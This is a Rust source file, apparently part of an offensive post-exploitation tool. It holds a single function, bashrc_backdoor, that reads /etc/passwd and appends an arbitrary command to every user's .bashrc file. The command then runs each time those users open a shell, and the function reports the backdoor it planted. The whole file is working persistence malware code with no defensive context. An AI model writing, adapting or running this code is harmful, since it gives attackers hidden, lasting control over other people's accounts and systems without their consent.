use std::fs::OpenOptions;
use std::io::Write;
use std::path::Path;
use crate::ui::{print_status, print_success};

pub fn bashrc_backdoor(command: String) {
    let passwd = std::fs::read_to_string("/etc/passwd").expect("Failed to read /etc/passwd");
    let mut users: Vec<&str> = passwd.split("\n").collect();
    let mut sum = 0;
    for user in users {
        let user = user.split(":").collect::<Vec<&str>>().get(0).expect("Failed to extract user from /etc/passwd").to_string();
        if !Path::exists(Path::new(&format!("/home/{}/.bashrc", user))) {
            continue;
        }
        let mut file = OpenOptions::new()
            .write(true)
            .append(true)
            .open(format!("/home/{}/.bashrc", user))
            .expect("Failed to open .bashrc");

        file.write_all(format!("\n{}", command).as_bytes()).expect("Failed to write to .bashrc");
        print_status(format!("Backdoor added to /home/{}/.bashrc", user));
        sum += 1;
    }
    print_success(format!("Backdoor added to {} users' .bashrc files", sum));
}